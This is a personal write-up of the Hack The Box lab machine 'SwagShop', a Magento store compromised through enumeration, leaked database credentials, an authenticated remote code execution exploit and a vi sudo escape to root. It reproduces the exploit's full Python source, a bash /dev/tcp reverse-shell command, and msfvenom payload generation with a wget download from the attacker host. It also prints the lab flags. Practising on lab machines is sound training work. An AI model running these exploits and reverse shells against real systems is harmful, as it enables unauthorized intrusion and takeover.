---
title: "SwagBox"
date: 2020-11-14T17:47:06+01:00
draft: false
summary: "This machine is used to learn more about the common Magento shop platform and to use a service such as vim for privileage escalation. With this machine I have practiced the common steps needed for penetration testing. This is said because the machine is classified as an easy machine. "
---

#### Machine Skills

-----

This machine is used to learn more about the common Magento shop platform and to use a service such as vim for privileage escalation. With this machine I have practiced the common steps needed for penetration testing. This is said because the machine is classified as an easy machine. 



#### Step 1 - Enumeration
-----
As for all machines the first step was to enumerate on the nmap ports with an UDP scan.

    kali@kali:~$ nmap -sV -sC -oA ./~/Documents/NmapScanWeek2 10.10.10.140
    Failed to open normal output file ./~/Documents/NmapScanWeek2.nmap for writing
    QUITTING!
    kali@kali:~$ nmap -sV -sC  10.10.10.140                                                      
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 04:31 EDT                                                             
    Nmap scan report for 10.10.10.140
    Host is up (0.086s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
    |   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
    |_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Home page
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

As it can be seen from the scan there are 2 open ports this gives the machine an easy to understand step by step plan. First exploit the web interface or the service running on port 80 until I can get credentials or a way to use the ssh port hopefully a key or something like that.

Next I use Nikto to find any vulnerable paths

    nikto -h 10.10.10.140
    - Nikto v2.1.6
    ---------------------------------------------------------------------------
    + Target IP:          10.10.10.140
    + Target Hostname:    10.10.10.140
    + Target Port:        80
    + Start Time:         2020-09-14 05:01:51 (GMT-4)
    ---------------------------------------------------------------------------
    + Server: Apache/2.4.18 (Ubuntu)
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
    + No CGI Directories found (use '-C all' to force check all possible dirs)
    + OSVDB-39272: /favicon.ico file identifies this app/server as: Magento Go CMS
    + OSVDB-39272: /skin/frontend/base/default/favicon.ico file identifies this app/server as: Magento Go CMS
    + Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
    + Web Server returns a valid response with junk HTTP methods, this may cause false positives.
    + OSVDB-3268: /app/: Directory indexing found.
**+ OSVDB-3092: /app/: This might be interesting...**

    + OSVDB-3268: /includes/: Directory indexing found.

**+ OSVDB-3092: /includes/: This might be interesting...**

    + OSVDB-3268: /lib/: Directory indexing found.
    + OSVDB-3092: /lib/: This might be interesting...

With the help of those 2 paths I start looking for some interesting files or information. Luckly I find the following page 

![AppDirectory](/SwagShop/AppDirectory.png)
##### [Figure 1.1 - /app directory on the machine] 

After some digging through all the files here I was able to find some potential helpful information on etc/

![EtcDirectory](/SwagShop/AppEtcDirectory.png)
##### [Figure 1.2 - /app/etc directory on the machine] 

inside the local.xml file there was information about the version of magento that is being used. At first I did not know what this was but after looking at the front page of the website some more I was able to conclude that this is a framework much like wordpress but specialised for virtual stores.

**Contents of local.xml**

        **
        * Magento
        *
        * NOTICE OF LICENSE
        *
        * This source file is subject to the Academic Free License (AFL 3.0)
        * that is bundled with this package in the file LICENSE_AFL.txt.
        * It is also available through the world-wide-web at this URL:
        * http://opensource.org/licenses/afl-3.0.php
        * If you did not receive a copy of the license and are unable to
        * obtain it through the world-wide-web, please send an email
        * to license@magentocommerce.com so we can send you a copy immediately.
        *
        * DISCLAIMER
    <config><global><install><date>Wed, 08 May 2019 07:23:09 +0000</date></install><crypt><key>b355a9e0cd018d3f7f03607141518419</key></crypt><disable_local_modules>false</disable_local_modules><resources><db><table_prefix></table_prefix></db><default_setup><connection>
    
    **<host>localhost</host>**

    **<username>root</username>**

    **<password>fMVWh7bDHpgZkyfqQXreTjU9</password>**

    **<dbname>swagshop</dbname>**

    <initStatements>SET NAMES utf8</initStatements>
    <model>mysql4</model><type>pdo_mysql</type>
    <pdoType></pdoType><active>1</active>
    </connection></default_setup>
    </resources><session_save>files</session_save></global><admin><routers><adminhtml><args><frontName>admin</frontName></args></adminhtml></routers></admin></config>

Looking at the dbname I thought I could find an exploit for this machine something to do with sql.

---
### Step 2 -Exploitation
---
    searchsploit magensearchsploit magento
    ------------------------------------------------------------------------------------------ ---------------------------------
    Exploit Title                                                                            |  Path
    ------------------------------------------------------------------------------------------ ---------------------------------
    eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                              | php/webapps/38573.txt
    eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)   | php/webapps/38651.txt
    Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site  | php/webapps/32808.txt
    Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross | php/webapps/32809.txt
    Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                 | php/webapps/32810.txt
    Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                            | php/webapps/39838.php
**Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution**                             | php/webapps/37811.py
    
**Magento eCommerce - Local File Disclosure**                                                 | php/webapps/19793.txt
  
    Magento eCommerce - Remote Code Execution                                                 | xml/webapps/37977.py
    Magento Server MAGMI Plugin - Multiple Vulnerabilities                                    | php/webapps/35996.txt
    Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                               | php/webapps/35052.txt
    Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass              | php/webapps/48135.php
    ------------------------------------------------------------------------------------------ ---------------------------------
    Shellcodes: No Results

    Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                              | php/webapps/37811.py


    searchsploit -x php/webapps/37811.py
    searchsploit -x php/webapps/19793.txt

    searchsploit -m xml/webapps/37977.py

For the exploitation part I was able to find the current version of magento which proved to be old and had some preexisting exploits to it. 
As such I tried them out. I was hoping to connect directly to the ssh but it seems there is a remote code execution exploit

![AdminPage](/SwagShop/AdminPage.png)
![CodeExploit](/SwagShop/CodeExploit.png)
##### [Figure 1.3 - Code exploit get admin page ] 

In this page is the code for the executable needed to get a reverse shell going from the admin page.


    from hashlib import md5
    import sys
    import re
    import base64
    import mechanize


    def usage():
        print "Usage: python %s <target> <argument>\nExample: python %s http://localhost \"uname -a\""
        sys.exit()


    if len(sys.argv) != 3:
        usage()

    # Command-line args
    target = sys.argv[1]
    arg = sys.argv[2]

    # Config.
    username = 'admin'
    password = 'admin'
    php_function = 'system'  # Note: we can only pass 1 argument to the function
    install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml

    # POP chain to pivot into call_user_exec
    payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
            '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
            'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
            'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
            '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
            ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                        len(arg), arg)
    # Setup the mechanize browser and options
    br = mechanize.Browser()
    #br.set_proxies({"http": "localhost:8080"})
    br.set_handle_robots(False)

    request = br.open(target)

    br.select_form(nr=0)
    br.form.new_control('text', 'login[username]', {'value': username})  # Had to manually add username control.
    br.form.fixup()
    br['login[username]'] = username
    br['login[password]'] = password

    br.method = "POST"
    request = br.submit()
    content = request.read()

    url = re.search("ajaxBlockUrl = \'(.*)\'", content)
    url = url.group(1)
    key = re.search("var FORM_KEY = '(.*)'", content)
    key = key.group(1)

    request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
    tunnel = re.search("src=\"(.*)\?ga=", request.read())
    tunnel = tunnel.group(1)

    payload = base64.b64encode(payload)
    gh = md5(payload + install_date).hexdigest()

    exploit = tunnel + '?ga=' + payload + '&h=' + gh

    try:
        request = br.open(exploit)
    except (mechanize.HTTPError, mechanize.URLError) as e:
        print e.read()

The code used to get inside the machine with a reverse shell


    kali@kali:~/Documents/Week3 -HackTheBox$ python 37811.py http://10.10.10.140/index.php/admin/ 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'
    Traceback (most recent call last):
    File "37811.py", line 55, in <module>
        br['login[username]'] = username
    File "/home/kali/.local/lib/python2.7/site-packages/mechanize/_mechanize.py", line 809, in __setitem__
        self.form[name] = val
    File "/home/kali/.local/lib/python2.7/site-packages/mechanize/_form_controls.py", line 1963, in __setitem__
        control = self.find_control(name)
    File "/home/kali/.local/lib/python2.7/site-packages/mechanize/_form_controls.py", line 2355, in find_control
        return self._find_control(name, type, kind, id, label, predicate, nr)
    File "/home/kali/.local/lib/python2.7/site-packages/mechanize/_form_controls.py", line 2446, in _find_control
        description)

    /// failed attempt 
    //read up on mechanize this could be a good thing to learn. It's useful to browse forms.
    //pdb is used for debuggin in python, should learn python indepth if I want to have a better time at this.


This was a failed attmept at using the mahchine

---
### Step 3 - Foothold
---

    kali@kali:~/Documents/Week3 -HackTheBox$ msfvenom -p linux/x64/shell_reverse_ipv6_tcp LHOST=dead:beef:2::1011 LPORT=12345 -f elf -o lin-x64-ipv6-rev-12345.elf
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 90 bytes
    Final size of elf file: 210 bytes
    Saved as: lin-x64-ipv6-rev-12345.elf
    kali@kali:~/Documents/Week3 -HackTheBox$ python3 -m http.server
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
    10.10.10.140 - - [21/Sep/2020 12:40:08] "GET /lin-x64-ipv6-rev-12345.elf HTTP/1.1" 200 -
    10.10.10.140 - - [21/Sep/2020 12:43:15] "GET /lin-x64-ipv6-rev-12345.elf HTTP/1.1" 200 -

    //--------------==========================================-------------------

    kali@kali:~/Documents/Week3 -HackTheBox$ python 37811.py http://10.10.10.140/index.php/admin 'wget 10.10.14.19:8000/lin-x64-ipv6-rev-12345.elf'

    kali@kali:~/Documents/Week3 -HackTheBox$ python 37811.py http://10.10.10.140/index.php/admin 'chmod +x lin-x64-ipv6-rev-12345.elf && ./lin-x64-ipv6-rev-12345.elf'

    //---==================================---------------
    nc -nvl6p 12345
    Listening on :: 12345
    Connection received on dead:beef::250:56ff:feb9:a0bf 47500


    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ls       
....etc look throuhg it to see what I find.

Using nc to open a listening port to connect to machine and then running the script I was able to get inside the machine with a reverse shell, even though the shell was kind of hard to use.

cd home
ls
haris
cd haris
ls
user.txt
cat user.txt
a448877277e82f05e5ddf9f90aefbac8
echo "$USER"
---
### Step 4 - Privilage Escalation
---

For privileage escalation I had to look through the machine and to find any programs that might run with escalated privelages.
I first tried sudo su which did not work next I looked for services with admin privileages and found sudo -l

    sudo -l
    Matching Defaults entries for www-data on swagshop:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User www-data may run the following commands on swagshop:
        (root) NOPASSWD: /usr/bin/vi /var/www/html/*
    sudo /usr/bin/vi /var/www/html/something
    Vim: Warning: Output is not to a terminal
    Vim: Warning: Input is not from a terminal

    E558: Terminal entry not found in terminfo
    'unknown' not known. Available builtin terminals are:
        builtin_amiga
        builtin_beos-ansi
        builtin_ansi
        builtin_pcansi
        builtin_win32
        builtin_vt320
        builtin_vt52
        builtin_xterm
        builtin_iris-ansi
        builtin_debug
        builtin_dumb




    :!sh
    ~
    ~
    ~
    :!sh
    i
    sh: 1: i: not found
    id
    uid=0(root) gid=0(root) groups=0(root)
    cat root/root.txt
    cat: root/root.txt: No such file or directory
    cat /root/root.txt
    c2b087d66e14a652a3b86a130ac56721

    ___ ___
    /| |/|\| |\
    /_| ´ |.` |_\           We are open! (Almost)
    |   |.  |
    |   |.  |         Join the beta HTB Swag Store!
    |___|.__|       https://hackthebox.store/password

                    PS: Use root flag as password!

What happend here I eneted into /var/www/www-data file which had sudo privileges withm vim and then from vim I escaped to a terminal making  myself root and giving myself access to the root shell.